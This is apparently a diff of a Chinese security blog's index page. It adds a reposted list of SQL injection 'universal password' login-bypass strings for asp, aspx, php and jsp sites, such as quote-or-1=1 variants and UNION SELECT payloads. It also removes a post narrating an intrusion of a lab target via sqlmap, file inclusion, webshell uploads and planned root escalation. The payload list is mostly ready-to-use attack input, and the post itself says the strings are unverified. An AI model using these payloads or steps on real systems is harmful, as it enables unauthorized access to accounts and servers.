@@ -138,6 +138,93 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
+                <a class="clearlink" href="15585815946395.html">
+                
+                  <h1>万能密码</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>内容收集自网络，是否有效并未验证<br/>
+原文链接：<a href="https://blog.csdn.net/u012804180/article/details/51932863">asp、aspx、php、jsp万能密码大全</a></p>
+</blockquote>
+
+<p>-------asp万能密码 <br/>
+      &#39;or&#39;=&#39;or&#39;</p>
+
+<p>--------aspx万能密码<br/>
+   1： &quot;or &quot;a&quot;=&quot;a<br/>
+   2： &#39;)or(&#39;a&#39;=&#39;a<br/>
+   3：or 1=1--<br/>
+   4：&#39;or 1=1--<br/>
+   5：a&#39;or&#39; 1=1--<br/>
+   6： &quot;or 1=1--<br/>
+   7：&#39;or&#39;a&#39;=&#39;a<br/>
+   8： &quot;or&quot;=&quot;a&#39;=&#39;a<br/>
+   9：&#39;or&#39;&#39;=&#39;<br/>
+   10：&#39;or&#39;=&#39;or&#39;<br/>
+   11: 1 or &#39;1&#39;=&#39;1&#39;=1<br/>
+   12: 1 or &#39;1&#39;=&#39;1&#39; or 1=1<br/>
+   13: &#39;OR 1=1%00<br/>
+   14: &quot;or 1=1%00<br/>
+   15: &#39;xor<br/>
+   16: 新型万能登陆密码</p>
+
+<p>   用户名 &#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39; （替换表名admin）<br/>
+   密码 1<br/>
+   Username=-1%cf&#39; union select 1,1,1 as password,1,1,1 %23<br/>
+   Password=1</p>
+
+<p>   17..admin&#39; or &#39;a&#39;=&#39;a 密码随便<br/>
+ <br/>
+--------PHP万能密码<br/>
+   &#39;or&#39;=&#39;or&#39;<br/>
+   &#39;or 1=1/*  字符型 GPC是否开都可以使用</p>
+
+<p>   User: something<br/>
+   Pass: &#39; OR &#39;1&#39;=&#39;1</p>
+
+<p> <br/>
+--------jsp 万能密码<br/>
+   1&#39;or&#39;1&#39;=&#39;1<br/>
+   admin&#39; OR 1=1/*<br/>
+ <br/>
+   用户名：admin    系统存在这个用户的时候 才用得上<br/>
+   <br/>
+   密码：1&#39;or&#39;1&#39;=&#39;1</p>
+
+<hr/>
+
+<p>作者：xss_01 <br/>
+来源：CSDN <br/>
+原文：<a href="https://blog.csdn.net/u012804180/article/details/51932863">https://blog.csdn.net/u012804180/article/details/51932863</a> <br/>
+版权声明：本文为博主原创文章，转载请附上博文链接！</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/23 11:19 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
                 <a class="clearlink" href="15578813198735.html">
                 
                   <h1>家思</h1>
@@ -581,46 +668,6 @@ Officer）是企业治理结构发展到一个新阶段的必然产物。没有�
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15554000328653.html">
-                
-                  <h1>最近遇到的一个靶机</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>1、查看 http 流量，后台扫描等进行信息收集，得出其用的是 xxxxcms，然后百度进一步进行信息收集，得出该 cms 存在过 sql 注入、文件包含等漏洞。<br/>
-2、全站测试 sql 注入，发现确实存在注入点<br/>
-3、上 sqlmap 进行扫描，得出管理员账号密码，得出 mysql 为普通用户权限。<br/>
-4、登录网站后台，利用文件包含漏洞获取部分.php 文件信息，对其进行编辑写入小马。（这块之前没怎么玩过，因此稍微花费了一点时间，目的达到了，不过不优雅）<br/>
-5、通过小马传入大马，然后连接大马。<br/>
-6、提权拿 linux 的 root，这里我不太懂，因此正在找资料，希望今晚能搞定提权这事。</p>
-
-<p>提权这块研究一下，搞出来了再写。目前的思路是通过 shell 查看操作系统版本和内核版本，查看已安装的包和程序，看看有没有一直漏洞可以利用。</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/4/16 15:33 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -706,6 +753,12 @@ Officer）是企业治理结构发展到一个新阶段的必然产物。没有�
 	      
 		      
 			      <li class="post">
+			        <a href="15597856399146.html">黑盒测试中的信息收集</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15596178265897.html">业务逻辑漏洞安全检查checklist</a>
 			      </li>
 		     
@@ -725,12 +778,6 @@ Officer）是企业治理结构发展到一个新阶段的必然产物。没有�
 		      
 			      <li class="post">
 			        <a href="15591786403220.html">双因素覆盖不全</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15591049197350.html">今日相思</a>
 			      </li>
 		     
 		  
